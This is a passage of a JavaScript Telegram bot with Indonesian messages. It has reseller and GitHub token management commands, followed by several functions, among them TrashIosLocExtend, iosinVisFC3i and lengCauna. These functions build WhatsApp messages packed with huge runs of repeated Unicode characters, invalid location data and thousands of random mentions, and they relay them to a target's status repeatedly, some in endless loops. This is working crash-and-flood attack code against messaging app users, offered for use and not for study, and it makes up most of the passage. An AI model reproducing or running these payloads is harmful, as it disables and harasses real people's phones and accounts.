    if (resellers.includes(resellerId)) {
        return bot.sendMessage(chatId, `⚠️ Reseller ${resellerId} sudah ada.`);
    }

    resellers.push(resellerId);
    saveReseller(resellers);
    bot.sendMessage(chatId, `✅ Reseller ${resellerId} berhasil ditambahkan.`);
});

bot.onText(/\/delreseller (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const resellerId = match[1];
    let resellers = loadReseller();
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
    
    if (!isStaf(userId) && !isOwner(userId)) {
        return bot.sendMessage(chatId, "❌ Hanya staf atau owner yang bisa pakai command ini.");
    }

    if (!resellers.includes(resellerId)) {
        return bot.sendMessage(chatId, `⚠️ Reseller ${resellerId} tidak ditemukan.`);
    }

    resellers = resellers.filter(id => id !== resellerId);
    saveReseller(resellers);
    bot.sendMessage(chatId, `✅ Reseller ${resellerId} berhasil dihapus.`);
});

bot.onText(/\/listreseller/, (msg) => {
    const chatId = msg.chat.id;
    const resellers = loadReseller();
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

    if (resellers.length === 0) return bot.sendMessage(chatId, "⚠️ Belum ada reseller.");

    bot.sendMessage(chatId, `📋 Daftar Reseller:\n${resellers.join("\n")}`);
});
//====================TEST DATABASE TOKEN======================================\\
const { Octokit } = require("@octokit/rest");
const GITHUB_CONFIG_PATH = path.join(__dirname, "Tools", "github.json");
if (!fs.existsSync(GITHUB_CONFIG_PATH)) throw new Error("File github.json tidak ditemukan!");
const { OWNER, REPO, BRANCH, FILE_PATH, TOKEN } = JSON.parse(fs.readFileSync(GITHUB_CONFIG_PATH, "utf-8"));
const octokit = new Octokit({ auth: TOKEN });

async function loadTokens() {
    try {
        const githubFile = await octokit.repos.getContent({
            owner: OWNER,
            repo: REPO,
            path: FILE_PATH,
            ref: BRANCH
        });

        const content = Buffer.from(githubFile.data.content, "base64").toString();
        const json = JSON.parse(content);
        return { tokens: json.tokens || [], sha: githubFile.data.sha };
    } catch (err) {
        console.error("Error load tokens:", err.message);
        return { tokens: [], sha: null };
    }
}

async function saveTokens(tokens, sha) {
    try {
        await octokit.repos.createOrUpdateFileContents({
            owner: OWNER,
            repo: REPO,
            path: FILE_PATH,
            message: "Update tokens via Telegram bot",
            content: Buffer.from(JSON.stringify({ tokens }, null, 2)).toString("base64"),
            branch: BRANCH,
            sha: sha || undefined
        });
    } catch (err) {
        console.error("Error save tokens:", err.message);
    }
}

bot.onText(/\/addtoken (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const newToken = match[1].trim();
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
    
    if (!isStaf(userId) && !isOwner(userId) && !isReseller(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya staf, owner, atau reseller yang bisa pakai command ini.");
    }

    let { tokens, sha } = await loadTokens();

    if (tokens.includes(newToken)) {
        return bot.sendMessage(chatId, "⚠️ Token sudah ada di GitHub!");
    }

    tokens.push(newToken);
    await saveTokens(tokens, sha);

    bot.sendMessage(chatId, `✅ Token berhasil ditambahkan & dipush ke GitHub!\n\nToken: ${newToken}`);
});

bot.onText(/\/deltoken (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const delToken = match[1].trim();
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
    
    if (!isStaf(userId) && !isOwner(userId) && !isReseller(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya staf, owner, atau reseller yang bisa pakai command ini.");
    }

    let { tokens, sha } = await loadTokens();

    if (!tokens.includes(delToken)) {
        return bot.sendMessage(chatId, "❌ Token tidak ditemukan di GitHub!");
    }

    tokens = tokens.filter(t => t !== delToken);
    await saveTokens(tokens, sha);

    bot.sendMessage(chatId, `✅ Token berhasil dihapus & diupdate di GitHub!\n\nToken: ${delToken}`);
});

bot.onText(/\/listtoken/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const { tokens } = await loadTokens();    
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

    function isOwner(userId) {
    return config.OWNER_ID.includes(userId.toString());
    }

    if (tokens.length === 0) return bot.sendMessage(chatId, "⚠️ Tidak ada token tersimpan di GitHub.");

    bot.sendMessage(chatId, `📃 Daftar Token di GitHub:\n${tokens.join("\n")}`);
});

//====================DI BAWAH SINI ISI FUNCTION ELU==============================\\
async function TrashIosLocExtend(sock, target) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://xrelly-Iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰ𝘅𝗿𝗹.𝛆𝛘󠁀𞥆𝛆 ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let i = 0; i < 100; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
   
    if (i < 99) {
      await new Promise(resolve => setTimeout(resolve, 5000));
    }  
};

async function iosinVisFC3i(sock, target, mention) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      while(true) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
};

async function lengCauna(target) {
    let bv
    const rge = (str, times) => {
        let chunk = str.repeat(10000);
        let result = "";
        while (times > 0) {
            let add = Math.min(times, 10000);
            result += chunk.slice(0, add);
            times -= add;
        }
        return result;
    };
    const q = {
        conversation: rge("ꦽ", 30000),
        extendedTextMessage: {
            text: rge("ꦽ", 30000),
            contextInfo: {
                mentionedJid: Array.from(
                    { length: 1900 },
                    () => "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
                ),
                stanzaId: "id-" + Math.floor(Math.random() * 999999999),
                participant: "0@s.whatsapp.net"
            }
        }
    };
    for (let i = 0; i < 1000; i++) {
    const msg = {
        extendedTextMessage: {
            text: rge("ꦽ", 30000),
            contextInfo: {
                mentionedJid: Array.from(
                    { length: 1900 },
                    () => "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
                ),
                fromMe: true,
                quotedMessage: {
                    conversation: rge("ꦽ", 30000),
                    extendedTextMessage: {
                        text: rge("ꦽ", 30000),
                        contextInfo: {
                            mentionedJid: Array.from(
                                { length: 1900 },
                                () => "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
                            ),
                            stanzaId: "id-" + Math.floor(Math.random() * 999999999),
                            participant: "0@s.whatsapp.net"
                        }
                    }
                },
                disappearingMode: {
                    initiator: "CHANGED_IN_CHAT",
                    trigger: "CHAT_SETTING"
                }
            }
        }
    };
    bv = await generateWAMessageFromContent(target, msg, { quote: q });
    };
    await sock.relayMessage("status@broadcast", bv.message, {
        messageId: bv.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}

async function BlankClickOne(sock, target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
